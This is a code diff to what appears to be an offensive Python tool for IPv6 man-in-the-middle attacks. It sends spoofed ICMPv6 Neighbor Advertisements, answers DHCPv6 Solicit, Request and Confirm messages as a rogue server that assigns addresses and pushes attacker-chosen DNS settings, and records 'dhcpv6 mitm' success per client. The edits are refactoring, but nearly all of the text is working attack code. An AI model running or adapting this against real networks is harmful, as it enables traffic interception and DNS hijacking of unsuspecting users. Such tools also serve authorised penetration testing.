@@ -170,17 +170,19 @@ def reply(request):
         if request['ICMPv6']['type'] == 135:
 
             # region Get ICMPv6 Neighbor Solicitation target address
-            target_address = request['ICMPv6']['target-address']
+            target_address: str = request['ICMPv6']['target-address']
+            if target_address.startswith('fe80::'):
+                return
+            else:
+                na_packet: bytes = icmpv6.make_neighbor_advertisement_packet(ethernet_src_mac=your_mac_address,
+                                                                             ipv6_src=your_local_ipv6_address,
+                                                                             target_ipv6_address=target_address)
             # endregion
 
             # region Network prefix in ICMPv6 Neighbor Solicitation target address is bad
-            if not target_address.startswith('fe80::'):
-                if not target_address.startswith(network_prefix_address):
-                    na_packet = icmpv6.make_neighbor_advertisement_packet(ethernet_src_mac=your_mac_address,
-                                                                          ipv6_src=your_local_ipv6_address,
-                                                                          target_ipv6_address=target_address)
-                    for _ in range(5):
-                        raw_socket.send(na_packet)
+            if not target_address.startswith(network_prefix_address):
+                for _ in range(5):
+                    raw_socket.send(na_packet)
             # endregion
 
             # region ICMPv6 Neighbor Solicitation target address is your local IPv6 address
@@ -212,13 +214,8 @@ def reply(request):
 
                     # ICMPv6 Neighbor Solicitation target address is not DHCPv6 advertise IPv6 address
                     else:
-                        if not target_address.startswith('fe80::'):
-                            na_packet = icmpv6.make_neighbor_advertisement_packet(ethernet_src_mac=your_mac_address,
-                                                                                  ipv6_src=your_local_ipv6_address,
-                                                                                  target_ipv6_address=target_address)
-                            for _ in range(5):
-                                raw_socket.send(na_packet)
-
+                        for _ in range(5):
+                            raw_socket.send(na_packet)
             # endregion
 
             # region Print MITM Success message
@@ -249,28 +246,28 @@ def reply(request):
         # region Get Client identifier and Identity Association for Non-temporary Address
         cid: Union[None, bytes] = None
         iaid: Union[None, int] = None
-        for opt in request['DHCPv6']['options']:
-            if opt['type'] == 1:
-                cid = opt['value']['raw']
-            elif opt['type'] == 3:
-                iaid = opt['value']['iaid']
+
+        for option in request['DHCPv6']['options']:
+            if option['type'] == 1:
+                cid = option['value']['raw']
+            elif option['type'] == 3:
+                iaid = option['value']['iaid']
+
+        if cid is None or iaid is None:
+            base.print_info('Malformed DHCPv6 packet from: ', request['IPv6']['source-ip'] +
+                            ' (' + request['Ethernet']['source'] + ')', ' XID: ',
+                            hex(request['DHCPv6']['transaction-id']))
+            return
         # endregion
 
         # region DHCPv6 Solicit
         if request['DHCPv6']['message-type'] == 1:
 
-            # Get Client Identifier and IA_NA/IAID values
-            if cid is None or iaid is None:
-                base.print_info('Malformed DHCPv6 Solicit from: ', request['IPv6']['source-ip'] +
-                                ' (' + request['Ethernet']['source'] + ')', ' XID: ',
-                                hex(request['DHCPv6']['transaction-id']))
-                return
-
             # Set IPv6 address in advertise packet
             if target['ipv6_address'] is not None:
                 ipv6_address = target['ipv6_address']
             else:
-                ipv6_address = network_prefix.split('/')[0] + str(randint(first_suffix, last_suffix))
+                ipv6_address = network_prefix_address + str(randint(first_suffix, last_suffix))
 
             # Make and send DHCPv6 advertise packet
             dhcpv6_advertise = dhcpv6.make_advertise_packet(ethernet_src_mac=your_mac_address,
@@ -295,21 +292,19 @@ def reply(request):
 
             # Add client info in global clients dictionary
             add_client_info_in_dictionary(client_mac_address,
-                                          {'dhcpv6 solicit': True,
-                                           'advertise address': ipv6_address},
+                                          {'dhcpv6 solicit': True, 'advertise address': ipv6_address},
                                           client_already_in_dictionary)
-
         # endregion
 
         # region DHCPv6 Request
         if request['DHCPv6']['message-type'] == 3:
 
             # Set DHCPv6 reply packet
-            dhcpv6_reply = None
+            dhcpv6_reply: Union[None, bytes] = None
 
             # region Get Client DUID time, IPv6 address and Server MAC address
-            client_ipv6_address = None
-            server_mac_address = None
+            client_ipv6_address: Union[None, str] = None
+            server_mac_address: Union[None, str] = None
 
             for dhcpv6_option in request['DHCPv6']['options']:
                 if dhcpv6_option['type'] == 2:
@@ -318,7 +313,7 @@ def reply(request):
                     client_ipv6_address = dhcpv6_option['value']['ipv6-address']
             # endregion
 
-            if server_mac_address and client_ipv6_address is not None:
+            if server_mac_address is not None and client_ipv6_address is not None:
 
                 # Check Server MAC address
                 if server_mac_address != your_mac_address:
@@ -331,9 +326,8 @@ def reply(request):
                         client_mac_address,
                         {'dhcpv6 mitm': 'success'},
                         client_already_in_dictionary)
-
                     try:
-                        if client_ipv6_address == clients[client_mac_address]['advertise address'] and cid is not None:
+                        if client_ipv6_address == clients[client_mac_address]['advertise address']:
                             dhcpv6_reply = dhcpv6.make_reply_packet(ethernet_src_mac=your_mac_address,
                                                                     ethernet_dst_mac=request['Ethernet']['source'],
                                                                     ipv6_src=your_local_ipv6_address,
@@ -406,13 +400,10 @@ def reply(request):
         # region DHCPv6 Confirm
         if request['DHCPv6']['message-type'] == 4:
 
-            # region Get Client DUID time and client IPv6 address
-            client_duid_time = 0
-            client_ipv6_address = None
+            # region Get Client IPv6 address
+            client_ipv6_address: Union[None, str] = None
 
             for dhcpv6_option in request['DHCPv6']['options']:
-                if dhcpv6_option['type'] == 1:
-                    client_duid_time = dhcpv6_option['value']['duid-time']
                 if dhcpv6_option['type'] == 3:
                     client_ipv6_address = dhcpv6_option['value']['ipv6-address']
             # endregion
@@ -426,7 +417,7 @@ def reply(request):
                                                     dns_address=recursive_dns_address,
                                                     domain_search=dns_search,
                                                     ipv6_address=client_ipv6_address,
-                                                    client_duid_timeval=client_duid_time)
+                                                    cid=cid)
             raw_socket.send(dhcpv6_reply)
             # endregion
 
